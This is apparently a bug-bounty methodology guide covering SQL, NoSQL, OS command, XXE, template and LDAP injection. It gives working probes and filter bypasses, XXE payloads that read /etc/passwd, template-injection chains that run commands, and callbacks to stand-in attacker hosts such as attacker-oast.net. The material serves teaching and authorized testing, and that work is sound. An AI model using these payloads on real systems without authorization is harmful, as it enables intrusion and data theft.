# 02. Injection Vulnerabilities

Covers: SQL Injection, NoSQL Injection, OS Command Injection, XXE, Server-Side Template Injection, LDAP Injection.

All injection bugs share one root pattern: **user input reaches an interpreter (SQL engine, shell, XML parser, template engine, LDAP query) without being separated from the interpreter's own syntax.** Testing methodology is always: find where input reaches an interpreter → confirm you can break out of the expected data context → escalate from "I can break syntax" to "I can extract data / execute code."

---

## 1. SQL Injection

**Root cause:** user input is concatenated into a SQL query instead of being passed as a parameterised value.

**Where to find it:**
- Any input that plausibly touches a database query: search boxes, login forms, filters/sort params, "similar items" widgets, report generators
- Less obvious spots: cookies, `X-Forwarded-For` and other headers, JSON body fields, REST path segments (`/products/123` where `123` is used in a query), multi-part form fields
- Any endpoint returning data that looks row-based (tables, lists, paginated results)

**Methodology:**
1. Enumerate every parameter on the endpoint (query string, body, headers, cookies) — don't just test the obvious one.
2. Send basic syntax-breaking probes and diff the response against a baseline: `'`, `''`, `"`, `` ` ``, `;`, backslash. Look for a change in status code, error message, response length, or response time.
3. If you get a DB error, it usually tells you the engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) — tailor everything after this to that engine's syntax.
4. Pick a technique based on what the app shows you:
   - **Error-based** — if raw DB errors reach the response, use engine-specific functions to leak data via the error message (`CONVERT`, `EXTRACTVALUE`, `CAST`).
   - **UNION-based** — if query output is reflected in the page, determine column count with `ORDER BY n--` (increment until it errors) or `UNION SELECT NULL,NULL,...--`, then swap `NULL`s for `@@version`, `current_user`, or a subquery against `information_schema`.
   - **Boolean-blind** — no errors, no reflected output, but the page visibly differs (content, redirect, status) between true/false conditions: `AND 1=1` vs `AND 1=2`.
   - **Time-blind** — no visible difference at all: `AND IF(1=1,SLEEP(5),0)` (MySQL), `AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)` (Postgres), `;WAITFOR DELAY '0:0:5'--` (MSSQL).
   - **Out-of-band (OAST)** — when even timing is unreliable (async processing, load balancers): trigger a DNS/HTTP callback to your Burp Collaborator equivalent, e.g. via `LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker-oast.net\\a'))` on MSSQL/MySQL variants.
5. Once confirmed, extract systematically: DB name/version → table names (`information_schema.tables`) → column names → data. Automate the mechanical extraction with sqlmap once you've manually confirmed the injection point and technique (manual-first avoids sqlmap missing a nonstandard injection context, and avoids the noise/rate-limit risk of pointing an automated tool at every parameter blind).
6. Escalate impact where relevant: `INTO OUTFILE`/`LOAD_FILE` (MySQL file read/write if privileges allow), `xp_cmdshell` (MSSQL RCE if enabled and you have sysadmin), stacked queries where the driver allows them.

**Probes:**
```
'
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL,NULL,NULL--
' AND SLEEP(5)--
```

**Bypass notes (WAF/filter present):** alternate comment styles (`/**/` instead of spaces), case variation (`SeLeCt`), inline comments to split keywords (`UN/**/ION SEL/**/ECT`), encoding (URL/double-URL/Unicode), using `||` string concat instead of blocked keywords, second-order injection (payload stored now, triggers when read back in a *different* query later — test anywhere data you've already submitted gets reused).

**Tools:** Burp (manual + Intruder for blind timing), `sqlmap`, `ffuf` for parameter discovery first if the injection point isn't obvious.

**When to prioritize:** any DB-backed dynamic content, immediately after Phase 3 mapping identifies query-like params (filters, sorts, search) — see the trigger table in file 01.

**Go deeper:** PortSwigger Academy "SQL injection" topic (their UNION/blind/OOB lab progression is the best hands-on trainer for this); HackTricks `pentesting-web/sql-injection`.

---

## 2. NoSQL Injection

**Root cause:** user input is passed into a NoSQL query (commonly MongoDB) as a structured object instead of a plain scalar, letting an attacker inject query operators.

**Where to find it:** login forms and search/filter functionality on apps using MongoDB/Couch/etc. (tech fingerprint from recon helps here) — especially where the backend parses JSON bodies directly into query objects.

**Methodology:**
1. Test auth bypass by sending operators instead of scalars in a login body: if the backend does something like `db.users.find({username: req.body.username, password: req.body.password})` without type-checking, sending an object instead of a string can be dangerous.
2. Try content-type juggling — the same login form via `application/json` vs `application/x-www-form-urlencoded` can hit different parsing paths, one of which may allow nested objects where the other doesn't.
3. For blind extraction, use `$regex` character-by-character to infer field values from response timing/behavior differences.

**Probes:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
```
As URL-encoded form params: `username[$ne]=toString&password[$ne]=toString`

**Bypass notes:** if `[$ne]`-style bracket syntax is stripped, try raw JSON body injection instead (or vice versa) — filters are often applied to only one content-type.

**Tools:** Burp Repeater/Intruder; `NoSQLMap` for automation once confirmed manually.

**When to prioritize:** as soon as tech fingerprinting suggests a NoSQL backend, test every auth and filter endpoint with operator injection before moving to relational-style SQLi probes.

**Go deeper:** PortSwigger Academy "NoSQL injection" topic; HackTricks `pentesting-web/nosql-injection`.

---

## 3. OS Command Injection

**Root cause:** user input reaches a shell/system call, either directly or via a library function that shells out under the hood.

**Where to find it:** file conversion/processing tools (image resize, PDF generation, video transcode), network diagnostic utilities exposed in admin panels (ping/traceroute/nslookup "test connectivity" widgets), anything that shells out to ImageMagick/ffmpeg/git/etc.

**Methodology:**
1. Identify features that plausibly call OS binaries under the hood — anything doing file format conversion or "run a diagnostic" is high-probability.
2. Probe with shell metacharacters appended to an otherwise-valid input, so the original command still runs and yours appends: `; whoami`, `| whoami`, `` `whoami` ``, `$(whoami)`, `&& whoami`.
3. If output isn't reflected (blind), use time-based confirmation (`; sleep 10`) or OOB (`; curl attacker-oast.net`) instead.
4. If input validation blocks spaces or specific characters, use documented bypasses (see below) before assuming the sink isn't reachable.

**Probes:**
```
; whoami
| whoami
`whoami`
$(whoami)
|| ping -c 5 127.0.0.1
; curl http://<oast-id>.oastify.com
```

**Bypass notes:** blocked spaces → `${IFS}` or `<` /`{ls,-la}` (brace expansion); blocked keywords → wildcards (`/???/??t /???/p??sw*` style tricks) or case/encoding variation; blocked characters via denylist → check what's *not* blocked rather than assuming full coverage.

**Tools:** Burp Repeater/Intruder with time-based payload lists, `commix` for automation once a candidate parameter is identified.

**When to prioritize:** whenever Phase 3 mapping turns up a file-processing or "test connection"-style feature — see trigger table in file 01.

**Go deeper:** PortSwigger Academy "OS command injection" topic; HackTricks `pentesting-web/command-injection`.

---

## 4. XXE (XML External Entity Injection)

**Root cause:** an XML parser is configured to resolve external entities, letting attacker-defined `<!ENTITY>` declarations read local files or trigger outbound requests.

**Where to find it:** any endpoint that accepts raw XML (SOAP services, XML-RPC), and — less obviously — any file upload that accepts a format that's secretly XML under the hood: SVG, DOCX/XLSX/PPTX (all ZIP archives of XML), or any "import from file" feature.

**Methodology:**
1. Find or force an XML content-type — some JSON endpoints will still parse XML if you change `Content-Type` and body, which is worth testing even where XML isn't the advertised format.
2. Start with classic external entity file read, referencing the entity inside a field that gets echoed back in the response.
3. If nothing is reflected, go blind: use an external DTD hosted on your OOB listener to exfiltrate file contents via a follow-up out-of-band request (classic reflected XXE is often patched while blind/OOB is missed).
4. For file-upload-based XXE (SVG/DOCX/etc.), rebuild the file format with your entity injected into the relevant internal XML part, re-zip if needed (for Office formats), and upload normally.
5. Try XInclude as an alternative when the app parses your XML as a fragment inside a larger, already-XML document (so you can't control the full `<!DOCTYPE>`).

**Probes:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
Blind/OOB (external DTD hosted at attacker-controlled URL):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker-oast.net/evil.dtd"> %xxe; ]>
```
SVG upload variant:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**Bypass notes:** if `SYSTEM "file://..."` is blocked, try parameter entities and OOB exfiltration instead of direct reflection; try alternate wrapper schemes and different XML declarations if the parser is picky about well-formedness before it even reaches your entity.

**Tools:** Burp (manual crafting + XXE-specific extensions), a controlled OOB listener for blind cases.

**When to prioritize:** immediately whenever recon finds XML/SOAP endpoints or file upload accepting SVG/Office documents — see trigger table in file 01.

**Go deeper:** PortSwigger Academy "XXE injection" topic; HackTricks `pentesting-web/xxe-xee-xml-external-entity`.

---

## 5. Server-Side Template Injection (SSTI)

**Root cause:** user input is concatenated into a template *before* rendering, rather than passed in as data to a template that's already been compiled — so the template engine parses attacker syntax as template logic.

**Where to find it:** "preview my message" features, PDF/report/invoice generation, customizable email templates, any "personalize this page" functionality that clearly does string substitution.

**Methodology:**
1. Detect with a math-based polyglot that's valid syntax across multiple engines: `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`, `${{7*7}}`. If the response shows `49` instead of the literal string, you have SSTI (or worse, plain code eval).
2. Fingerprint the exact engine — different engines respond differently to slightly malformed polyglots (e.g., Jinja2 vs Twig vs Freemarker vs Velocity each error uniquely), or just check server tech from recon (Python/Flask → likely Jinja2; PHP/Symfony → likely Twig; Java → likely Freemarker/Velocity).
3. Move from math confirmation to config/object access, then to code execution, using engine-specific gadget chains.
4. Distinguish SSTI from client-side template injection (Angular-style `{{constructor.constructor('alert(1)')()}}`) early — they look similar in a probe but the exploitation path is completely different (client-side stays in the browser, more like XSS; SSTI is server-side and often leads to RCE).

**Probes:**
```
${7*7}
{{7*7}}
${{7*7}}
#{7*7}
<%= 7*7 %>
```
Jinja2 (Python) RCE path once confirmed:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
Twig (PHP) RCE path:
```
{{['id']|filter('system')}}
```

**Bypass notes:** if the direct polyglot is filtered, try each engine's syntax individually since generic filters often only catch one style; for engines that sandbox `__globals__`/builtins, look for a documented sandbox-escape gadget chain specific to that engine version (these change frequently — check current research for the fingerprinted engine/version rather than relying on a single memorized chain).

**Tools:** `tplmap` for automated engine fingerprinting and exploitation once you've manually confirmed the injection point; Burp for manual work.

**When to prioritize:** whenever recon surfaces a template/PDF/report-generation feature — see trigger table in file 01. High-value because SSTI frequently leads directly to RCE.

**Go deeper:** PortSwigger Academy "Server-side template injection" topic (their engine-identification methodology is excellent); HackTricks `pentesting-web/ssti-server-side-template-injection`.

---

## 6. LDAP Injection

**Root cause:** user input is concatenated into an LDAP filter string used against a directory service (commonly backing enterprise login/SSO).

**Where to find it:** login forms and search features on apps backed by Active Directory/LDAP — more common in enterprise/internal-tool bug bounty targets than consumer SaaS.

**Methodology:**
1. Probe login/search fields with LDAP metacharacters and watch for behavior change: `*`, `(`, `)`, `\`, `NUL`.
2. Try wildcard-based auth bypass, similar in spirit to SQLi's `' OR '1'='1`.
3. For blind cases, use boolean-based extraction against filter attributes one character at a time.

**Probes:**
```
*
*)(uid=*))(|(uid=*
admin)(&)
```

**Tools:** Burp Intruder for blind boolean extraction.

**When to prioritize:** enterprise/internal tooling targets, especially anything mentioning SSO/AD integration in recon.

**Go deeper:** OWASP Cheat Sheet Series "LDAP Injection Prevention"; HackTricks `pentesting-web/ldap-injection`.
